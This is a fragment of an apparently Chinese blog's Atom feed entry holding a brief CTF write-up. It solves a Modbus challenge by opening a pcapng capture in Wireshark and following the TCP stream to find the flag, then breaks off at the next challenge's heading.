        &lt;p&gt;神奇的Modbus&lt;br&gt;发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.&lt;br&gt;推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。&lt;/p&gt;
&lt;p&gt;神秘的交易&lt;br&gt; &lt;img src=
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
